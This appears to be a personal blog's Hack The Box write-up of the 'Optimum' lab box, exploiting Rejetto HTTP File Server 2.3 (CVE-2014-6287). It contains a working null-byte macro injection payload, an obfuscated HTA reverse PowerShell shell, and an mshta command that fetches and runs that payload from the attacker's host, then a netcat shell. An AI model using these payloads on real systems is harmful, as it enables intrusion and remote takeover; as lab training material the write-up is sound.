@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Optimum | Welcome to another retired Hack The Box write-up named Optimum. This box shows an RCE vulnerability of the Rejetto HTTP File Server 2.3,...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Optimum</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-02-14 10:25:00+00:00">Fri 14 February 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Optimum.html">Optimum</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Optimum.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Welcome to another retired Hack The Box write-up named Optimum. This box shows an RCE  vulnerability of the Rejetto HTTP  File Server 2.3, CVE-2014-6287. This vulnerability exists due to a poor regex in the file ParserLib.pas. In fact, the findMacroMarker function allows remote attackers to execute arbitrary programs via a %00 sequence in a a search action. Let us demonstrate the issue.</p>
+<h1>Initial Nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="mf">10.10.10.8</span><span class="w">                                                     </span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">14</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="n">GMT</span><span class="w">                                </span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.8</span><span class="w">                                                              </span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.056</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">                                                                 </span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65534</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w">                                                              </span>
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w">                                                                 </span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">HttpFileServer</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.3</span><span class="w">                                                </span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">HFS</span><span class="w"> </span><span class="mf">2.3</span><span class="w">                                                                </span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">HFS</span><span class="w"> </span><span class="o">/</span><span class="w">                                                                          </span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">                                       </span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">540.74</span><span class="w"> </span><span class="n">seconds</span><span class="w">                                 </span>
+</pre></div>
+
+
+<p>The initial nmap shows only port 80 is open and <strong>HttpFileServer httpd 2.3</strong> is running, also the server hosting this application is a Windows machine. Having a look on the web I find the HFS official website <a href="https://www.rejetto.com/hfs/"></a> where HFS is described as follow:</p>
+<p><strong><em>You can use HFS (HTTP File Server) to send and receive files. It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux.</em></strong></p>
+<p>It is clear we are dealing with a webserver that gives the possibility to upload files for sharing purposes. A search with searchsploit gives the following results:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# searchsploit hfs 2.3</span>
+<span class="err">----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="err"> Exploit Title                                                                                                                                       |  Path</span>
+<span class="err">                                                                                                                                                     | (/usr/share/exploitdb/)</span>
+<span class="err">----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="err">Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                       | exploits/multiple/remote/30850.txt</span>
+<span class="err">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                  | exploits/windows/remote/34668.txt</span>
+<span class="err">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                  | exploits/windows/remote/39161.py</span>
+<span class="err">Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                             | exploits/windows/webapps/34852.txt</span>
+<span class="err">----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="c">Shellcodes: No Result                                                                  </span>
+</pre></div>
+
+
+<p>Exploit 34668 shows this:</p>
+<div class="highlight"><pre><span></span><span class="c1"># Exploit Title: HttpFileServer 2.3.x Remote Command Execution</span>
+<span class="c1"># Google Dork: intext:&quot;httpfileserver 2.3&quot;</span>
+<span class="c1"># Date: 11-09-2014</span>
+<span class="c1"># Remote: Yes</span>
+<span class="c1"># Exploit Author: Daniele Linguaglossa</span>
+<span class="c1"># Vendor Homepage: http://rejetto.com/</span>
+<span class="c1"># Software Link: http://sourceforge.net/projects/hfs/</span>
+<span class="c1"># Version: 2.3.x</span>
+<span class="c1"># Tested on: Windows Server 2008 , Windows 8, Windows 7</span>
+<span class="c1"># CVE : CVE-2014-6287</span>
+
+<span class="n">issue</span> <span class="nb">exists</span> <span class="n">due</span> <span class="nb">to</span> <span class="n">a</span> <span class="n">poor</span> <span class="k">regex</span><span class="n"> in</span> <span class="n">the</span> <span class="n">file</span> <span class="n">ParserLib</span>.<span class="n">pas</span>
+
+
+<span class="n">function</span> <span class="n">findMacroMarker</span>(<span class="o">s</span>:<span class="n">string</span>; <span class="n">ofs:integer</span>=<span class="mi">1</span>):<span class="n">integer</span>;
+<span class="n">begin</span> <span class="n">result:</span>=<span class="n">reMatch</span>(<span class="o">s</span>, <span class="s">&#39;\{[.:]|[.:]\}|\|&#39;</span>, <span class="s">&#39;m!&#39;</span>, <span class="k">ofs</span>) <span class="nb">end</span>;
+
+
+<span class="n">it</span> <span class="k">will</span> <span class="nb">not</span> <span class="n">handle</span> <span class="n">null</span> <span class="n">byte</span> <span class="o">so</span> <span class="n">a</span> <span class="n">request</span> <span class="nb">to</span>
+
+<span class="n">http:</span>//<span class="n">localhost:80</span>/?<span class="n">search</span>=<span class="nv">%00</span>{<span class="sr">.exec|cmd.</span>}
+
+<span class="k">will</span> <span class="n">stop</span> <span class="k">regex</span><span class="n"> from</span> <span class="n">parse</span> <span class="k">macro</span> , <span class="o">and</span> <span class="k">macro</span> <span class="k">will</span> <span class="n">be</span> <span class="n">executed</span> <span class="o">and</span> <span class="n">remote</span> <span class="n">code</span> <span class="n">injection</span> <span class="n">happen</span>.
+
+
+<span class="c1">## EDB Note: This vulnerability will run the payload multiple times simultaneously. </span>
+<span class="c1">##   Make sure to take this into consideration when crafting your payload (and/or listener).</span>
+</pre></div>
+
+
+<p>According to this, we can use the <code>search</code> box in our favor and run any (Windows) commands we want remotely. </p>
+<p><img alt="" src="../images/optimum-rejetto.png"></p>
+<p>As an example I filled the <code>search</code> box with "test" as shown in the screenshot above and I sent the request to burp. This is what the request looks like in burp:</p>
+<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/?search=test</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">10.10.10.8</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">HFS_SID=0.185858400771394</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</pre></div>
+
+
+<p>so I edit the GET part as instructed in the exploit and I add the string <code>C%3a\Windows\system32\ping.exe+10.10.14.3.</code> instead of <code>cmd.</code>. The string is the URL encoded and it decodes to <code>C:\Windows\system32\ping.exe 10.10.14.3.</code> where 10.10.14.3 is the IP address of my kali box. I am doing this in order to verify the RCE. The request will be as follow:</p>
+<p><img alt="" src="../images/optimum-burp-ping.png"></p>
+<p>Before sending the request I had started a tcpdump on my kali box filtering specifically for icmp traffic to verify if the ping works:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# tcpdump -i tun0 icmp</span>
+<span class="c">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span>
+<span class="err">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span>
+<span class="c">06:31:28.789828 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 49, length 40</span>
+<span class="c">06:31:28.789868 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 49, length 40</span>
+<span class="c">06:31:28.789879 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 50, length 40</span>
+<span class="c">06:31:28.789885 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 50, length 40</span>
+<span class="c">06:31:28.789893 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 51, length 40</span>
+<span class="c">06:31:28.789898 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 51, length 40</span>
+<span class="c">06:31:28.789911 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 52, length 40</span>
+<span class="c">06:31:28.789915 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 52, length 40</span>
+<span class="c">06:31:29.813484 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 53, length 40</span>
+<span class="c">06:31:29.813519 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 53, length 40</span>
+<span class="c">06:31:29.813531 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 54, length 40</span>
+<span class="c">06:31:29.813535 IP 10.10.14.3 &gt; 10.10.10.8: ICMP echo reply, id 1, seq 54, length 40</span>
+<span class="c">06:31:29.813542 IP 10.10.10.8 &gt; 10.10.14.3: ICMP echo request, id 1, seq 55, length 40</span>
+</pre></div>
+
+
+<p>and as shown above I am able to see ICMP packets coming. This confirms the RCE. We can now use something else instead of ping in order to get a reverse shell</p>
+<p>For this demo I am going to use a tool called <a href="https://github.com/felamos/weirdhta">WeirdHTA</a> which will help me to create an obfuscated HTA script that contains a reverse Power Shell payload. Then we can use <a href="https://attack.mitre.org/techniques/T1170/">MSHTA</a> to run the HTA script. </p>
+<p>Thus, I clone weirdHTA into my kali box:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Tools# git clone https://github.com/felamos/weirdhta.git</span>
+<span class="err">Cloning into &#39;weirdhta&#39;...</span>
+<span class="c">remote: Enumerating objects: 161, done.</span>
+<span class="c">remote: Counting objects: 100% (161/161), done.</span>
+<span class="c">remote: Compressing objects: 100% (132/132), done.</span>
+<span class="c">remote: Total 161 (delta 50), reused 76 (delta 21), pack-reused 0</span>
+<span class="err">Receiving objects: 100% (161/161), 66.23 KiB | 477.00 KiB/s, done.</span>
+<span class="err">Resolving deltas: 100% (50/50), done.</span>
+</pre></div>
+
+
+<p>then I ran weirdHTA and I generate an HTA script which contains the reverse Power Shell:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Tools</span><span class="o">/</span><span class="n">weirdhta</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">weirdhta</span><span class="p">.</span><span class="n">py</span><span class="w"> </span>
+
+<span class="w"> </span><span class="err">█</span><span class="w">     </span><span class="err">█░▓█████</span><span class="w">  </span><span class="err">██▓</span><span class="w"> </span><span class="err">██▀███</span><span class="w">  </span><span class="err">▓█████▄</span><span class="w">     </span><span class="err">██░</span><span class="w"> </span><span class="err">██</span><span class="w"> </span><span class="err">▄▄▄█████▓</span><span class="w"> </span><span class="err">▄▄▄</span><span class="w">                                                                                                                                                                                    </span>
+<span class="err">▓█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█░▓█</span><span class="w">   </span><span class="err">▀</span><span class="w"> </span><span class="err">▓██▒▓██</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">██▒▒██▀</span><span class="w"> </span><span class="err">██▌</span><span class="w">   </span><span class="err">▓██░</span><span class="w"> </span><span class="err">██▒▓</span><span class="w">  </span><span class="err">██▒</span><span class="w"> </span><span class="err">▓▒▒████▄</span><span class="w">                                                                                                                                                                                  </span>
+<span class="err">▒█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█</span><span class="w"> </span><span class="err">▒███</span><span class="w">   </span><span class="err">▒██▒▓██</span><span class="w"> </span><span class="err">░▄█</span><span class="w"> </span><span class="err">▒░██</span><span class="w">   </span><span class="err">█▌</span><span class="w">   </span><span class="err">▒██▀▀██░▒</span><span class="w"> </span><span class="err">▓██░</span><span class="w"> </span><span class="err">▒░▒██</span><span class="w">  </span><span class="err">▀█▄</span><span class="w">                                                                                                                                                                                </span>
+<span class="err">░█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█</span><span class="w"> </span><span class="err">▒▓█</span><span class="w">  </span><span class="err">▄</span><span class="w"> </span><span class="err">░██░▒██▀▀█▄</span><span class="w">  </span><span class="err">░▓█▄</span><span class="w">   </span><span class="err">▌</span><span class="w">   </span><span class="err">░▓█</span><span class="w"> </span><span class="err">░██</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▓██▓</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">░██▄▄▄▄██</span><span class="w">                                                                                                                                                                               </span>
+<span class="err">░░██▒██▓</span><span class="w"> </span><span class="err">░▒████▒░██░░██▓</span><span class="w"> </span><span class="err">▒██▒░▒████▓</span><span class="w">    </span><span class="err">░▓█▒░██▓</span><span class="w">  </span><span class="err">▒██▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">▓█</span><span class="w">   </span><span class="err">▓██▒</span><span class="w">                                                                                                                                                                              </span>
+<span class="err">░</span><span class="w"> </span><span class="err">▓░▒</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░░</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">░░▓</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒▓</span><span class="w"> </span><span class="err">░▒▓░</span><span class="w"> </span><span class="err">▒▒▓</span><span class="w">  </span><span class="err">▒</span><span class="w">     </span><span class="err">▒</span><span class="w"> </span><span class="err">░░▒░▒</span><span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░░</span><span class="w">    </span><span class="err">▒▒</span><span class="w">   </span><span class="err">▓▒█░</span><span class="w">                                                                                                                                                                              </span>
+<span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">▒</span><span class="w">     </span><span class="err">▒</span><span class="w"> </span><span class="err">░▒░</span><span class="w"> </span><span class="err">░</span><span class="w">    </span><span class="err">░</span><span class="w">      </span><span class="err">▒</span><span class="w">   </span><span class="err">▒▒</span><span class="w"> </span><span class="err">░</span><span class="w">                                                                                                                                                                              </span>
+<span class="w">  </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">    </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░░</span><span class="w">   </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">  </span><span class="err">░░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">   </span><span class="err">▒</span><span class="w">                                                                                                                                                                                 </span>
+<span class="w">    </span><span class="err">░</span><span class="w">       </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">               </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">                                                                                                                                                                              </span>
+<span class="w">                              </span><span class="err">░</span><span class="w">                                                                                                                                                                                                                  </span>
+<span class="w">                                                    </span><span class="k">by</span><span class="w"> </span><span class="n">felamos</span><span class="w">                                                                                                                                                                                   </span>
+
+<span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">Powershell</span><span class="w"> </span><span class="nf">Reverse</span><span class="w"> </span><span class="n">Shell</span><span class="p">.</span><span class="w">                                                       </span>
+<span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="n">Custom</span><span class="w"> </span><span class="n">Command</span><span class="p">.</span><span class="w"></span>
+
+<span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w">                                                                        </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Enter</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.14.3</span><span class="w">                              </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Enter</span><span class="w"> </span><span class="nl">PORT</span><span class="p">:</span><span class="w"> </span><span class="mi">443</span><span class="w">                                                               </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Written</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">hta</span><span class="w"></span>
+</pre></div>
+
+
+<p>in the same directory where I have the script (test.hta) I ran a simple http server with python:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Tools/weirdhta# python -m SimpleHTTPServer </span>
+<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>At this point I need to modify the request in burp to contain this command<code>C:\Windows\system32\mshta.exe http://10.10.14.3:8000/test.hta.</code> and URL encode it with <code>CTRL+u</code></p>
+<p><img alt="" src="../images/optimum-burp-mshta.png"></p>
+<p>Since I had chosen port 443 as the port for the reverse shell within weirdHTA I had already started a netcat listener on that port and after sending the new request with burp I get the shell:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">443</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.3</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.8</span><span class="o">]</span><span class="w"> </span><span class="mi">49174</span><span class="w"></span>
+<span class="n">Client</span><span class="w"> </span><span class="n">Connected</span><span class="p">...</span><span class="w"></span>
+
+<span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"></span>
+<span class="n">optimum</span><span class="err">\</span><span class="n">kostas</span><span class="w"></span>
+</pre></div>
+
+
+<p>As shown above I am in as the user <code>kostas</code>. I am also able to read the user.txt (for some reasons it is called user.txt.txt, but it worked when I add it on HTB):</p>
+<div class="highlight"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">dir</span>
+<span class="n">dir</span>
+ <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
+ <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="n">D0BC</span><span class="o">-</span><span class="mi">0196</span>
+
+ <span class="n">Directory</span> <span class="k">of</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Desktop</span>
+
+<span class="mi">20</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">09</span><span class="p">:</span><span class="mi">23</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
+<span class="mi">20</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">09</span><span class="p">:</span><span class="mi">23</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
+<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">11</span>            <span class="mi">760</span><span class="p">.</span><span class="mi">320</span> <span class="n">hfs</span><span class="p">.</span><span class="n">exe</span>
+<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">13</span>                 <span class="mi">32</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="p">.</span><span class="n">txt</span>
+               <span class="mi">2</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>        <span class="mi">760</span><span class="p">.</span><span class="mi">352</span> <span class="n">bytes</span>
+               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">31</span><span class="p">.</span><span class="mi">893</span><span class="p">.</span><span class="mi">934</span><span class="p">.</span><span class="mi">080</span> <span class="n">bytes</span> <span class="k">free</span>
+
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="k">more</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="p">.</span><span class="n">txt</span>
+<span class="k">more</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">d0</span><span class="o">****************************</span><span class="mi">73</span>
